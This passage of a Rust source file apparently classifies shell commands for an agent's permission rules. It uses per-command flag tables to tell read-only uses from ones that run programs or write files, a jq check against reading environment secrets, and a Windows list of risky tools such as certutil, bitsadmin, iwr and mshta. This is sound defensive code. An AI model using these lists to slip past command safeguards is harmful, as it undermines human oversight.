            && tail.rfind('.').is_some_and(|dot| dot + 1 < tail.len())
    })
}

/// What a reading command's flag takes after it.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Takes {
    /// Nothing, as a switch.
    Nothing,
    /// A count, such as `3`, `+5` or `10K`.
    Count,
    /// A word that names no file, such as a format, a pattern or a glob.
    Word,
    /// A file or folder, or a word that one platform reads as one.
    Path,
    /// A word only in the same word, as in `--color=never`, or nothing.
    Joined,
    /// Two words, as jq's `--arg name value`.
    Pair,
}

/// How a reading command reads its flags. A flag it lists only reads, and any
/// other one asks: it could write a file, run a program or read a file the
/// words don't show. Long flags count only by their full names.
struct Options {
    /// The letters that are switches.
    letters: &'static str,
    /// The letters that take something.
    valued: &'static [(char, Takes)],
    /// The long switches.
    switches: &'static [&'static str],
    /// The long flags that take something.
    long: &'static [(&'static str, Takes)],
    /// Whether the first plain word is a pattern or a program rather than a
    /// file, unless a flag in `given_by` gives it.
    pattern: bool,
    /// The flags that give the pattern, so every plain word is a file.
    given_by: &'static [&'static str],
    /// Whether a letter's value can follow it in the same word, as in `-n5`.
    /// Without, it's always the next word and the letters go on.
    joined: bool,
    /// Whether a flag of digits alone is a count, as in `head -50`.
    digits: bool,
}

/// The switches every reading command takes.
const HELP: &[&str] = &["help", "version"];

/// What `options` read in a command's arguments.
struct Parsed<'a> {
    /// The words that name files or folders.
    paths: Vec<&'a str>,
    /// The words that aren't flags, their values or the pattern.
    plain: Vec<&'a str>,
    /// The pattern or program, when the first plain word is one.
    term: Option<&'a str>,
}

/// Reads `args` the way a program with `options` does, or none when one is a
/// flag the table doesn't list or a value that doesn't fit. GNU programs
/// read flags after files too, and BSD ones read those as files, so a value
/// after the first file counts as a path unless it's a count.
fn parse<'a>(options: &Options, args: &'a [String]) -> Option<Parsed<'a>> {
    let mut paths = Vec::new();
    let mut plain: Vec<&str> = Vec::new();
    let mut given = false;
    let mut dashes = false;
    let mut at = 0;
    while let Some(word) = args.get(at) {
        at += 1;
        if dashes || word == "-" || !word.starts_with('-') {
            plain.push(word);
            continue;
        }
        if word == "--" {
            dashes = true;
            continue;
        }
        let late = !plain.is_empty();
        if let Some(long) = word.strip_prefix("--") {
            let (name, value) = match long.split_once('=') {
                Some((name, value)) => (name, Some(value)),
                None => (long, None),
            };
            given |= options
                .given_by
                .iter()
                .any(|flag| flag.strip_prefix("--") == Some(name));
            let takes = if options.switches.contains(&name) || HELP.contains(&name) {
                Takes::Nothing
            } else {
                options.long.iter().find(|(flag, _)| *flag == name)?.1
            };
            take(takes, value, args, &mut at, late, &mut paths)?;
            continue;
        }
        let mut rest = &word[1..];
        if options.digits && rest.bytes().all(|byte| byte.is_ascii_digit()) {
            continue;
        }
        while let Some(letter) = rest.chars().next() {
            rest = &rest[letter.len_utf8()..];
            given |= options.given_by.iter().any(|flag| {
                !flag.starts_with("--")
                    && flag
                        .strip_prefix('-')
                        .is_some_and(|f| f.starts_with(letter))
            });
            if options.letters.contains(letter) || (options.digits && letter.is_ascii_digit()) {
                continue;
            }
            let takes = options.valued.iter().find(|(flag, _)| *flag == letter)?.1;
            let value = (options.joined && !rest.is_empty()).then(|| std::mem::take(&mut rest));
            take(takes, value, args, &mut at, late, &mut paths)?;
        }
    }
    let term = (options.pattern && !given && !plain.is_empty()).then(|| plain.remove(0));
    paths.extend(&plain);
    Some(Parsed { paths, plain, term })
}

/// Takes what a flag takes, from the rest of its word or the words after it,
/// and keeps the ones that may name files in `paths`. None when it's missing
/// or doesn't fit.
fn take<'a>(
    takes: Takes,
    joined: Option<&'a str>,
    args: &'a [String],
    at: &mut usize,
    late: bool,
    paths: &mut Vec<&'a str>,
) -> Option<()> {
    let values: Vec<&str> = match (takes, joined) {
        (Takes::Nothing | Takes::Pair, Some(_)) => return None,
        (Takes::Nothing | Takes::Joined, None) => return Some(()),
        (Takes::Pair, None) => {
            let pair = args.get(*at..*at + 2)?;
            *at += 2;
            pair.iter().map(String::as_str).collect()
        }
        (_, Some(value)) => vec![value],
        (_, None) => {
            let value = args.get(*at)?;
            *at += 1;
            vec![value.as_str()]
        }
    };
    if takes == Takes::Count && !values.iter().all(|value| is_count(value)) {
        return None;
    }
    if takes == Takes::Path || (late && takes != Takes::Count) {
        for value in values {
            paths.push(value);
            // Some parsers read `-f=name` as `name`.
            paths.extend(value.strip_prefix('='));
        }
    }
    Some(())
}

/// Whether `word` reads as a count, such as `3`, `+5`, `-2` or `10K`.
fn is_count(word: &str) -> bool {
    let word = word.strip_prefix(['+', '-']).unwrap_or(word);
    let unit = word.trim_start_matches(|c: char| c.is_ascii_digit());
    unit.len() < word.len() && unit.chars().all(|c| c.is_ascii_alphabetic())
}

/// The flag table for a reading command, or none for one that takes no
/// files, such as `echo`.
fn options_for(command: &str) -> Option<&'static Options> {
    Some(match command {
        "cat" => &CAT,
        "head" => &HEAD,
        "tail" => &TAIL,
        "wc" => &WC,
        "grep" | "egrep" | "fgrep" => &GREP,
        "rg" => &RG,
        "fd" => &FD,
        "tree" => &TREE,
        "file" => &FILE,
        "stat" => &STAT,
        "du" => &DU,
        "df" => &DF,
        "sort" => &SORT,
        "uniq" => &UNIQ,
        "cut" => &CUT,
        "diff" => &DIFF,
        "cmp" => &CMP,
        "realpath" => &REALPATH,
        "readlink" => &READLINK,
        "ls" => &LS,
        "date" => &DATE,
        "jq" => &JQ,
        _ => return None,
    })
}

/// A table's defaults: short values may be joined, no pattern, no digit flags.
const PLAIN: Options = Options {
    letters: "",
    valued: &[],
    switches: &[],
    long: &[],
    pattern: false,
    given_by: &[],
    joined: true,
    digits: false,
};

const CAT: Options = Options {
    letters: "AbeEnstTuvl",
    switches: &[
        "show-all",
        "number-nonblank",
        "show-ends",
        "number",
        "squeeze-blank",
        "show-tabs",
        "show-nonprinting",
    ],
    ..PLAIN
};

/// `head` and `tail` share their long flags.
const ENDS: &[(&str, Takes)] = &[("bytes", Takes::Count), ("lines", Takes::Count)];
const ENDS_SWITCHES: &[&str] = &["quiet", "silent", "verbose", "zero-terminated"];

const HEAD: Options = Options {
    letters: "qvz",
    valued: &[('n', Takes::Count), ('c', Takes::Count)],
    switches: ENDS_SWITCHES,
    long: ENDS,
    digits: true,
    ..PLAIN
};

/// No `-f` or `--follow`, which never end.
const TAIL: Options = Options {
    letters: "qvzr",
    valued: &[
        ('n', Takes::Count),
        ('c', Takes::Count),
        ('b', Takes::Count),
    ],
    switches: ENDS_SWITCHES,
    long: ENDS,
    digits: true,
    ..PLAIN
};

/// No `--files0-from`, which reads the files to count from another.
const WC: Options = Options {
    letters: "lwcmL",
    switches: &["bytes", "chars", "lines", "words", "max-line-length"],
    long: &[("total", Takes::Word)],
    ..PLAIN
};

/// No `-R`, which follows every link, or `--exclude-from`, which reads
/// another file.
const GREP: Options = Options {
    letters: "rinlLwxvcoqshHEFGPzZaIbUTy",
    valued: &[
        ('A', Takes::Count),
        ('B', Takes::Count),
        ('C', Takes::Count),
        ('m', Takes::Count),
        ('e', Takes::Word),
        ('f', Takes::Path),
        ('d', Takes::Word),
        ('D', Takes::Word),
    ],
    switches: &[
        "extended-regexp",
        "fixed-strings",
        "basic-regexp",
        "perl-regexp",
        "ignore-case",
        "no-ignore-case",
        "word-regexp",
        "line-regexp",
        "null-data",
        "no-messages",
        "invert-match",
        "byte-offset",
        "line-number",
        "no-line-number",
        "with-filename",
        "no-filename",
        "only-matching",
        "quiet",
        "silent",
        "text",
        "files-with-matches",
        "files-without-match",
        "count",
        "initial-tab",
        "null",
        "recursive",
        "line-buffered",
        "no-group-separator",
    ],
    long: &[
        ("after-context", Takes::Count),
        ("before-context", Takes::Count),
        ("context", Takes::Count),
        ("max-count", Takes::Count),
        ("regexp", Takes::Word),
        ("file", Takes::Path),
        ("include", Takes::Word),
        ("exclude", Takes::Word),
        ("exclude-dir", Takes::Word),
        ("include-dir", Takes::Word),
        ("label", Takes::Word),
        ("binary-files", Takes::Word),
        ("directories", Takes::Word),
        ("devices", Takes::Word),
        ("group-separator", Takes::Word),
        ("color", Takes::Joined),
        ("colour", Takes::Joined),
    ],
    pattern: true,
    given_by: &["-e", "-f", "--regexp", "--file"],
    digits: true,
    ..PLAIN
};

/// No `--pre`, `--pre-glob`, `--hostname-bin` or `-z`, which run programs,
/// no `-L`, which follows links, and no `--ignore-file`, which reads another
/// file.
const RG: Options = Options {
    letters: "nNiIsSlwxFvcoqHUaPpb0u.hV",
    valued: &[
        ('A', Takes::Count),
        ('B', Takes::Count),
        ('C', Takes::Count),
        ('m', Takes::Count),
        ('M', Takes::Count),
        ('j', Takes::Count),
        ('d', Takes::Count),
        ('e', Takes::Word),
        ('g', Takes::Word),
        ('t', Takes::Word),
        ('T', Takes::Word),
        ('r', Takes::Word),
        ('E', Takes::Word),
        ('f', Takes::Path),
    ],
    switches: &[
        "hidden",
        "no-hidden",
        "no-ignore",
        "ignore",
        "no-ignore-vcs",
        "ignore-vcs",
        "no-ignore-dot",
        "ignore-dot",
        "no-ignore-parent",
        "ignore-parent",
        "no-ignore-global",
        "ignore-global",
        "no-ignore-exclude",
        "ignore-exclude",
        "no-ignore-files",
        "ignore-files",
        "no-ignore-messages",
        "no-messages",
        "messages",
        "ignore-case",
        "smart-case",
        "case-sensitive",
        "fixed-strings",
        "no-fixed-strings",
        "word-regexp",
        "line-regexp",
        "invert-match",
        "no-invert-match",
        "count",
        "count-matches",
        "files",
        "files-with-matches",
        "files-without-match",
        "only-matching",
        "line-number",
        "no-line-number",
        "column",
        "no-column",
        "heading",
        "no-heading",
        "with-filename",
        "no-filename",
        "pretty",
        "vimgrep",
        "json",
        "no-json",
        "null",
        "null-data",
        "quiet",
        "text",
        "no-text",
        "binary",
        "no-binary",
        "multiline",
        "no-multiline",
        "multiline-dotall",
        "pcre2",
        "no-pcre2",
        "crlf",
        "no-crlf",
        "trim",
        "no-trim",
        "stats",
        "no-stats",
        "unrestricted",
        "byte-offset",
        "no-byte-offset",
        "no-follow",
        "no-search-zip",
        "passthru",
        "passthrough",
        "debug",
        "trace",
        "type-list",
        "no-config",
        "unicode",
        "no-unicode",
        "auto-hybrid-regex",
        "block-buffered",
        "line-buffered",
        "no-require-git",
        "one-file-system",
        "no-one-file-system",
        "include-zero",
        "no-include-zero",
        "max-columns-preview",
        "no-max-columns-preview",
        "glob-case-insensitive",
        "no-glob-case-insensitive",
        "sort-files",
        "no-context-separator",
    ],
    long: &[
        ("after-context", Takes::Count),
        ("before-context", Takes::Count),
        ("context", Takes::Count),
        ("max-count", Takes::Count),
        ("max-columns", Takes::Count),
        ("max-depth", Takes::Count),
        ("maxdepth", Takes::Count),
        ("threads", Takes::Count),
        ("regexp", Takes::Word),
        ("file", Takes::Path),
        ("glob", Takes::Word),
        ("iglob", Takes::Word),
        ("type", Takes::Word),
        ("type-not", Takes::Word),
        ("type-add", Takes::Word),
        ("type-clear", Takes::Word),
        ("replace", Takes::Word),
        ("encoding", Takes::Word),
        ("engine", Takes::Word),
        ("sort", Takes::Word),
        ("sortr", Takes::Word),
        ("color", Takes::Word),
        ("colors", Takes::Word),
        ("max-filesize", Takes::Word),
        ("context-separator", Takes::Word),
        ("field-match-separator", Takes::Word),
        ("field-context-separator", Takes::Word),
        ("path-separator", Takes::Word),
        ("dfa-size-limit", Takes::Word),
        ("regex-size-limit", Takes::Word),
        ("hyperlink-format", Takes::Word),
    ],
    pattern: true,
    given_by: &["-e", "-f", "--regexp", "--file", "--files", "--type-list"],
    ..PLAIN
};

/// No `-x` or `-X`, which run a command, `-l`, which runs `ls`, `-L`, which
/// follows links, `--base-directory` or `--ignore-file`. Its pattern counts
/// as a path too.
const FD: Options = Options {
    letters: "HIusiFgapq01",
    valued: &[
        ('t', Takes::Word),
        ('e', Takes::Word),
        ('E', Takes::Word),
        ('S', Takes::Word),
        ('c', Takes::Word),
        ('d', Takes::Count),
        ('j', Takes::Count),
    ],
    switches: &[
        "hidden",
        "no-hidden",
        "no-ignore",
        "ignore",
        "no-ignore-vcs",
        "ignore-vcs",
        "no-ignore-parent",
        "no-global-ignore-file",
        "unrestricted",
        "case-sensitive",
        "ignore-case",
        "glob",
        "regex",
        "fixed-strings",
        "absolute-path",
        "relative-path",
        "full-path",
        "print0",
        "prune",
        "one-file-system",
        "show-errors",
        "quiet",
        "no-require-git",
        "require-git",
        "no-follow",
    ],
    long: &[
        ("type", Takes::Word),
        ("extension", Takes::Word),
        ("exclude", Takes::Word),
        ("size", Takes::Word),
        ("color", Takes::Word),
        ("changed-within", Takes::Word),
        ("changed-before", Takes::Word),
        ("owner", Takes::Word),
        ("path-separator", Takes::Word),
        ("format", Takes::Word),
        ("and", Takes::Word),
        ("max-results", Takes::Count),
        ("min-depth", Takes::Count),
        ("exact-depth", Takes::Count),
        ("max-depth", Takes::Count),
        ("threads", Takes::Count),
        ("search-path", Takes::Path),
        ("strip-cwd-prefix", Takes::Joined),
        ("hyperlink", Takes::Joined),
    ],
    ..PLAIN
};

/// No `-o`, which writes a file, `-R`, which writes one in every folder,
/// `-l`, which follows links, or `--fromfile`, `--infofile` and
/// `--gitfile`, which read other files.
const TREE: Options = Options {
    letters: "adfixNCnshDFpugJXtrcvUqQAS",
    valued: &[
        ('L', Takes::Count),
        ('P', Takes::Word),
        ('I', Takes::Word),
        ('H', Takes::Word),
        ('T', Takes::Word),
    ],
    switches: &[
        "noreport",
        "dirsfirst",
        "filesfirst",
        "prune",
        "matchdirs",
        "ignore-case",
        "gitignore",
        "si",
        "du",
        "inodes",
        "device",
        "metafirst",
        "info",
        "nolinks",
    ],
    long: &[
        ("charset", Takes::Word),
        ("timefmt", Takes::Word),
        ("sort", Takes::Word),
        ("filelimit", Takes::Count),
    ],
    joined: false,
    ..PLAIN
};

/// No `-f`, which reads the files to look at from another, `-m`, which reads
/// a magic file, `-C`, which writes one, or `-z`, which runs decompressors.
const FILE: Options = Options {
    letters: "bhiIkLsNnrE0dv",
    valued: &[('e', Takes::Word), ('P', Takes::Word), ('F', Takes::Word)],
    switches: &[
        "mime-type",
        "mime-encoding",
        "apple",
        "extension",
        "brief",
        "mime",
        "keep-going",
        "no-dereference",
        "dereference",
        "no-pad",
        "no-buffer",
        "raw",
        "special-files",
        "print0",
    ],
    long: &[
        ("exclude", Takes::Word),
        ("exclude-quiet", Takes::Word),
        ("separator", Takes::Word),
        ("parameter", Takes::Word),
    ],
    ..PLAIN
};

/// `-f`, `-c` and `-t` take a format on one platform and are switches on
/// the other, so their next word counts as a path.
const STAT: Options = Options {
    letters: "FHLlnqrsx",
    valued: &[('f', Takes::Path), ('c', Takes::Path), ('t', Takes::Path)],
    switches: &["dereference", "file-system", "terse"],
    long: &[
        ("format", Takes::Word),
        ("printf", Takes::Word),
        ("cached", Takes::Word),
    ],
    ..PLAIN
};

/// No `--files0-from` or `-X`, which read other files, or `-L`, which
/// follows links.
const DU: Options = Options {
    letters: "0aAbcDghHklmnPrsSx",
    valued: &[
        ('d', Takes::Count),
        ('B', Takes::Word),
        ('t', Takes::Word),
        ('I', Takes::Word),
    ],
    switches: &[
        "all",
        "apparent-size",
        "bytes",
        "total",
        "dereference-args",
        "human-readable",
        "inodes",
        "count-links",
        "separate-dirs",
        "summarize",
        "one-file-system",
        "si",
        "null",
        "no-dereference",
    ],
    long: &[
        ("max-depth", Takes::Count),
        ("block-size", Takes::Word),
        ("threshold", Takes::Word),
        ("exclude", Takes::Word),
        ("time-style", Takes::Word),
        ("time", Takes::Joined),
    ],
    ..PLAIN
};

const DF: Options = Options {
    letters: "aHhiklPmgcbnT",
    valued: &[('B', Takes::Word), ('t', Takes::Word), ('x', Takes::Word)],
    switches: &[
        "all",
        "human-readable",
        "si",
        "inodes",
        "local",
        "portability",
        "sync",
        "no-sync",
        "total",
        "print-type",
    ],
    long: &[
        ("block-size", Takes::Word),
        ("type", Takes::Word),
        ("exclude-type", Takes::Word),
        ("output", Takes::Joined),
    ],
    ..PLAIN
};

/// No `-o`, which writes a file, `--compress-program`, which runs one,
/// or `-T`, `--files0-from` and `--random-source`, which use other files.
const SORT: Options = Options {
    letters: "bdfgiMhnRrVcCmsuz",
    valued: &[('k', Takes::Word), ('t', Takes::Word), ('S', Takes::Word)],
    switches: &[
        "ignore-leading-blanks",
        "dictionary-order",
        "ignore-case",
        "general-numeric-sort",
        "ignore-nonprinting",
        "month-sort",
        "human-numeric-sort",
        "numeric-sort",
        "random-sort",
        "reverse",
        "version-sort",
        "merge",
        "stable",
        "unique",
        "zero-terminated",
        "debug",
    ],
    long: &[
        ("key", Takes::Word),
        ("field-separator", Takes::Word),
        ("buffer-size", Takes::Word),
        ("sort", Takes::Word),
        ("parallel", Takes::Count),
        ("batch-size", Takes::Count),
        ("check", Takes::Joined),
    ],
    ..PLAIN
};

const UNIQ: Options = Options {
    letters: "cduizD",
    valued: &[
        ('f', Takes::Count),
        ('s', Takes::Count),
        ('w', Takes::Count),
    ],
    switches: &[
        "count",
        "repeated",
        "unique",
        "ignore-case",
        "zero-terminated",
    ],
    long: &[
        ("skip-fields", Takes::Count),
        ("skip-chars", Takes::Count),
        ("check-chars", Takes::Count),
        ("all-repeated", Takes::Joined),
        ("group", Takes::Joined),
    ],
    ..PLAIN
};

const CUT: Options = Options {
    letters: "nszw",
    valued: &[
        ('b', Takes::Word),
        ('c', Takes::Word),
        ('f', Takes::Word),
        ('d', Takes::Word),
    ],
    switches: &["complement", "only-delimited", "zero-terminated"],
    long: &[
        ("bytes", Takes::Word),
        ("characters", Takes::Word),
        ("fields", Takes::Word),
        ("delimiter", Takes::Word),
        ("output-delimiter", Takes::Word),
    ],
    ..PLAIN
};

/// No `-l`, which runs `pr`, or `-X`, `--from-file` and `--to-file`, which
/// read other files.
const DIFF: Options = Options {
    letters: "abBcdeEfhinNpPqrstTuwyZ",
    valued: &[
        ('U', Takes::Count),
        ('C', Takes::Count),
        ('W', Takes::Count),
        ('I', Takes::Word),
        ('F', Takes::Word),
        ('D', Takes::Word),
        ('L', Takes::Word),
        ('S', Takes::Word),
        ('x', Takes::Word),
    ],
    switches: &[
        "text",
        "ignore-space-change",
        "ignore-blank-lines",
        "ignore-all-space",
        "ignore-case",
        "ignore-tab-expansion",
        "ignore-trailing-space",
        "ignore-file-name-case",
        "no-ignore-file-name-case",
        "minimal",
        "new-file",
        "unidirectional-new-file",
        "show-c-function",
        "brief",
        "report-identical-files",
        "recursive",
        "expand-tabs",
        "initial-tab",
        "side-by-side",
        "left-column",
        "suppress-common-lines",
        "suppress-blank-empty",
        "strip-trailing-cr",
        "normal",
        "ed",
        "forward-ed",
        "rcs",
        "speed-large-files",
        "no-dereference",
    ],
    long: &[
        ("unified", Takes::Joined),
        ("context", Takes::Joined),
        ("color", Takes::Joined),
        ("width", Takes::Count),
        ("tabsize", Takes::Count),
        ("horizon-lines", Takes::Count),
        ("ignore-matching-lines", Takes::Word),
        ("show-function-line", Takes::Word),
        ("label", Takes::Word),
        ("starting-file", Takes::Word),
        ("exclude", Takes::Word),
        ("ifdef", Takes::Word),
        ("line-format", Takes::Word),
        ("old-line-format", Takes::Word),
        ("new-line-format", Takes::Word),
        ("unchanged-line-format", Takes::Word),
        ("old-group-format", Takes::Word),
        ("new-group-format", Takes::Word),
        ("changed-group-format", Takes::Word),
        ("unchanged-group-format", Takes::Word),
    ],
    ..PLAIN
};

const CMP: Options = Options {
    letters: "bhlsqvxz",
    valued: &[('i', Takes::Word), ('n', Takes::Count)],
    switches: &["print-bytes", "verbose", "quiet", "silent"],
    long: &[("ignore-initial", Takes::Word), ("bytes", Takes::Count)],
    ..PLAIN
};

const REALPATH: Options = Options {
    letters: "emLPqsz",
    switches: &[
        "canonicalize-existing",
        "canonicalize-missing",
        "logical",
        "physical",
        "quiet",
        "strip",
        "no-symlinks",
        "zero",
    ],
    long: &[("relative-to", Takes::Path), ("relative-base", Takes::Path)],
    ..PLAIN
};

const READLINK: Options = Options {
    letters: "efmnqsvz",
    switches: &[
        "canonicalize",
        "canonicalize-existing",
        "canonicalize-missing",
        "no-newline",
        "quiet",
        "silent",
        "verbose",
        "zero",
    ],
    ..PLAIN
};

/// No `-w`, `-T`, `-I` or `-D`, which take a value on one platform and not
/// the other, or `-L`, which follows links.
const LS: Options = Options {
    letters: "1@aAbBcCdeFfgGhHiklmnNoOpPqQrRsStuUvWxXZ",
    switches: &[
        "all",
        "almost-all",
        "author",
        "escape",
        "ignore-backups",
        "directory",
        "full-time",
        "group-directories-first",
        "no-group",
        "human-readable",
        "si",
        "inode",
        "kibibytes",
        "literal",
        "numeric-uid-gid",
        "hide-control-chars",
        "show-control-chars",
        "quote-name",
        "recursive",
        "reverse",
        "size",
        "zero",
        "context",
        "file-type",
        "dereference-command-line",
        "dereference-command-line-symlink-to-dir",
    ],
    long: &[
        ("color", Takes::Joined),
        ("classify", Takes::Joined),
        ("hyperlink", Takes::Joined),
        ("format", Takes::Word),
        ("sort", Takes::Word),
        ("time", Takes::Word),
        ("time-style", Takes::Word),
        ("indicator-style", Takes::Word),
        ("quoting-style", Takes::Word),
        ("block-size", Takes::Word),
    ],
    ..PLAIN
};

/// No `-s` or `--set`, which set the clock. `-f` and `-r` name a file on one
/// platform.
const DATE: Options = Options {
    letters: "uRjn",
    valued: &[
        ('d', Takes::Word),
        ('v', Takes::Word),
        ('r', Takes::Path),
        ('f', Takes::Path),
        ('I', Takes::Joined),
    ],
    switches: &["utc", "universal", "rfc-email", "debug", "resolution"],
    long: &[
        ("date", Takes::Word),
        ("file", Takes::Path),
        ("reference", Takes::Path),
        ("iso-8601", Takes::Joined),
        ("rfc-3339", Takes::Word),
    ],
    ..PLAIN
};

/// No `-f` or `-L`, which load a program or modules from files, or
/// `--rawfile` and `--slurpfile`, which read other files.
const JQ: Options = Options {
    letters: "acCeMnrRsSjhV",
    switches: &[
        "slurp",
        "raw-input",
        "null-input",
        "compact-output",
        "raw-output",
        "raw-output0",
        "join-output",
        "ascii-output",
        "sort-keys",
        "color-output",
        "monochrome-output",
        "tab",
        "exit-status",
        "seq",
        "stream",
        "stream-errors",
        "unbuffered",
        "args",
        "jsonargs",
        "build-configuration",
    ],
    long: &[
        ("arg", Takes::Pair),
        ("argjson", Takes::Pair),
        ("indent", Takes::Count),
    ],
    pattern: true,
    joined: false,
    ..PLAIN
};

/// Whether a jq program only reads its input: it doesn't read the
/// environment, which can hold tokens, or load a module from a file. A
/// field such as `.env` is fine.
fn jq_reads(program: &str) -> bool {
    const DENIED: &[&str] = &["env", "$ENV", "import", "include", "modulemeta"];
    let bytes = program.as_bytes();
    let mut at = 0;
    while at < bytes.len() {
        let start = at;
        if bytes[at] == b'$' {
            at += 1;
        }
        let name = at;
        while bytes
            .get(at)
            .is_some_and(|byte| byte.is_ascii_alphanumeric() || *byte == b'_')
        {
            at += 1;
        }
        if at == name {
            at = start + 1;
            continue;
        }
        let token = &program[start..at];
        let field = !token.starts_with('$')
            && start >= 1
            && bytes[start - 1] == b'.'
            && (start < 2 || bytes[start - 2] != b'.');
        if DENIED.contains(&token) && !field {
            return false;
        }
    }
    true
}

/// The arguments of `part` that can name files or folders, for a command with
/// no flag table. A pattern or a script isn't one, and some commands take no
/// paths at all.
fn path_words(part: &Part) -> Vec<&str> {
    let args = part.get(1..).unwrap_or(&[]);
    match part.first().map(String::as_str) {
        Some("echo" | "printf" | "tr" | "basename" | "dirname") => Vec::new(),
        Some("sed") => sed_words(args).map_or_else(
            || args.iter().map(String::as_str).collect(),
            |(_, files)| files,
        ),
        _ => (1..part.len())
            .filter(|at| !is_term(part, *at))
            .map(|at| part[at].as_str())
            .collect(),
    }
}

/// Where the first word of `args` sits that isn't a flag or a flag's count, as
/// in `git grep -A 3 foo`.
fn first_plain(args: &[String]) -> Option<usize> {
    const COUNTS: &[&str] = &[
        "-A",
        "-B",
        "-C",
        "-m",
        "--after-context",
        "--before-context",
        "--context",
        "--max-count",
    ];
    let mut at = 0;
    while let Some(arg) = args.get(at) {
        if arg == "--" {
            return (at + 1 < args.len()).then_some(at + 1);
        }
        if !arg.starts_with('-') {
            return Some(at);
        }
        let counted = COUNTS.contains(&arg.as_str())
            && args
                .get(at + 1)
                .is_some_and(|next| next.bytes().all(|byte| byte.is_ascii_digit()));
        at += if counted { 2 } else { 1 };
    }
    None
}

/// Whether the word at `at` in `part` is what a search looks for or a test's
/// filter, which names no file: the pattern of `git grep`, the value of a flag
/// such as `--grep` or `-k`, or a bare word after `cargo test` or `pnpm test`. A
/// word with a `/` or a leading `.` or `~` still counts as a path there, as does
/// one right after a flag, which may be that flag's value, and what `git grep -f`
/// reads.
fn is_term(part: &Part, at: usize) -> bool {
    const LOG_TERMS: &[&str] = &["--grep", "--author", "--committer", "-S", "-G"];
    const NAME_TERMS: &[&str] = &[
        "-name",
        "-iname",
        "-path",
        "-ipath",
        "-wholename",
        "-iwholename",
        "-regex",
        "-iregex",
    ];
    let word = part[at].as_str();
    let after = |flags: &[&str]| flags.contains(&part[at - 1].as_str());
    let rest = after_globals(part);
    let sub_at = part.len() - rest.len();
    match (part[0].as_str(), rest.first().map(String::as_str)) {
        ("git", Some("grep")) => at > sub_at && grep_term(&part[sub_at + 1..], at - sub_at - 1),
        ("git", Some("log")) => {
            after(LOG_TERMS)
                || word
                    .split_once('=')
                    .is_some_and(|(name, _)| LOG_TERMS.contains(&name))
        }
        ("cargo" | "npm" | "pnpm" | "yarn" | "bun", Some("test")) => {
            at > sub_at
                && !part[at - 1].starts_with('-')
                && !word.starts_with(['-', '.', '~'])
                && !word.contains('/')
        }
        ("go", Some("test")) => after(&["-run", "-skip"]),
        ("pytest", _) => after(&["-k", "-m"]),
        ("find", _) => after(NAME_TERMS),
        _ => false,
    }
}

/// Whether the word at `at` in `git grep`'s `args` is its pattern. With `-e`
/// the pattern is the word after it and every other word is a file or a
/// revision, with `-f` the pattern comes from a file, and after `--` every
/// word is a file.
fn grep_term(args: &[String], at: usize) -> bool {
    let dashes = args
        .iter()
        .position(|arg| arg == "--")
        .unwrap_or(args.len());
    let before = &args[..dashes];
    if at >= dashes || before.iter().any(|arg| names_flag(arg, &["-f", "--file"])) {
        return false;
    }
    if before.iter().any(|arg| names_flag(arg, &["-e"])) {
        return at > 0 && args[at - 1] == "-e";
    }
    first_plain(before) == Some(at)
}

/// The words a rule for `part` keeps: the command, its subcommand when it
/// has them, and the script a package manager's `run` runs.
fn key(part: &Part) -> Part {
    let Some(command) = part.first() else {
        return Vec::new();
    };
    let mut key = vec![command.clone()];
    if !WITH_SUBCOMMANDS.contains(&command.as_str()) {
        return key;
    }
    let rest = after_globals(part);
    let Some(sub) = rest.first().filter(|word| !word.starts_with('-')) else {
        return key;
    };
    key.push(sub.clone());
    let runs_script = SCRIPT_RUNNERS.contains(&command.as_str()) && sub == "run";
    let three = runs_script || command == "gh";
    if three && let Some(next) = rest.get(1).filter(|word| !word.starts_with('-')) {
        key.push(next.clone());
    }
    key
}

/// The words after a command's own options that come before its
/// subcommand, such as git's `-C <path>` or cargo's `+toolchain`.
fn after_globals(part: &Part) -> &[String] {
    let Some(command) = part.first() else {
        return &[];
    };
    let mut rest = &part[1..];
    loop {
        let Some(word) = rest.first() else {
            return rest;
        };
        let takes_value = match command.as_str() {
            "git" => match word.as_str() {
                "-C" => true,
                "--no-pager" => false,
                _ => return rest,
            },
            "cargo" if word.starts_with('+') => false,
            "npm" | "pnpm" | "yarn" | "bun" => match word.as_str() {
                "-C" | "--dir" | "--filter" | "-F" | "--prefix" | "-w" | "--workspace"
                | "--cwd" => true,
                "-r" | "--recursive" | "-s" | "--silent" => false,
                _ => return rest,
            },
            _ => return rest,
        };
        let skip = if takes_value { 2 } else { 1 };
        rest = rest.get(skip..).unwrap_or(&[]);
    }
}

/// Whether a rule for `part` has to keep its exact words.
fn risky(part: &Part, syntax: Syntax) -> bool {
    let Some(command) = part.first().map(String::as_str) else {
        return true;
    };
    if syntax == Syntax::Windows && windows_risky(command) {
        return true;
    }
    // A program written as a path could be anything, and a Mac's file system
    // finds `RM` for `rm`.
    if RISKY.contains(&command)
        || command.contains('/')
        || command.chars().any(|c| c.is_ascii_uppercase())
        || part.iter().any(|word| word == "publish")
        || loads_code(command, &part[1..])
    {
        return true;
    }
    match command {
        // The checks that make these read only decide whether they are.
        "find" | "sed" => !reads_only(part),
        _ if READERS.contains(&command) => !reads_only(part),
        "git" => git_risky(part),
        // A flag before the subcommand can pick another project, index or
        // settings file, which a rule for the subcommand alone wouldn't show.
        _ if WITH_SUBCOMMANDS.contains(&command) => {
            after_globals(part).first().is_some_and(|sub| {
                sub.starts_with('-')
                    || RISKY_SUBCOMMANDS.contains(&sub.as_str())
                    || runs_what_it_names(command, sub)
            })
        }
        _ => false,
    }
}

/// Commands a rule keeps whole on Windows, past [`RISKY`]: PowerShell's
/// aliases and `cmd.exe`'s commands that delete, move, overwrite, reach the
/// network, run code or change the system.
const WINDOWS_RISKY: &[&str] = &[
    "del",
    "erase",
    "rd",
    "ri",
    "move",
    "mi",
    "copy",
    "cpi",
    "xcopy",
    "robocopy",
    "ren",
    "rename",
    "rni",
    "ni",
    "md",
    "sc",
    "ac",
    "clc",
    "cli",
    "clv",
    "sp",
    "iex",
    "icm",
    "ii",
    "iwr",
    "irm",
    "saps",
    "start",
    "spps",
    "sajb",
    "call",
    "set",
    "setx",
    "sl",
    "chdir",
    "mklink",
    "taskkill",
    "reg",
    "regedit",
    "schtasks",
    "icacls",
    "takeown",
    "attrib",
    "certutil",
    "bitsadmin",
    "msiexec",
    "rundll32",
    "regsvr32",
    "mshta",
    "cscript",
    "wscript",
    "powershell",
    "pwsh",
    "cmd",
    "wsl",
    "winget",
    "choco",
    "scoop",
    "net",
    "netsh",
    "shutdown",
    "format",
    "diskpart",
    "runas",
    "explorer",
];

